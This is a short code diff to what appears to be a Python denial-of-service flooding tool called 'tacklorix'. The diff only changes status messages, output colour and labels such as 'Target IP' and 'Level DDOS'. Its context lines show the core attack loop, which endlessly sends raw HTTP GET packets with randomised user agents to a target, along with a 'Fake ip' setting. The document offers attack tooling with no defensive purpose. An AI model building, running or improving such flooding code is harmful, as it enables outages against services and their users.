@@ -120,7 +120,7 @@ def my_bots():
 
 #DDOS 1 + MASSEGS
 def attack(item):
-             with console.status("[bold dark_orange]Finishing Attacks CTRL+Z .....") as status:
+             with console.status("[bold dark_orange]for Stop DDOS = CTRL + Z") as status:
                  while True:
                      try:
                          packet = str("GET / HTTP/1.1\nHost: "+target+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
@@ -133,7 +133,7 @@ def attack(item):
                          
                          global already_connected_true
                          already_connected_true +=1
-                         console.print(f"attacks [{already_connected_true}] The attack succeeded port[{ports}] server[{target}] level[{levels}] !!!!",style="bold green")
+                         console.print(f"attacks [{already_connected_true}] The attack succeeded port[{ports}] server[{target}] level[{levels}] !!!!",style="bold red")
                      
                      except:
                          global already_connected_false
@@ -287,9 +287,9 @@ def usage3():
 def run():
     os.system("clear")
     console.print(f"""
-    Hoat : {str(target)}
+    Target IP : {str(target)}
     Port : {ports}
-    Level : {levels}
+    Level DDOS : {levels}
     Fake ip : {fake_ip}
        """)
     for step in track(range(1500),description=" run DDOS tacklorix"):
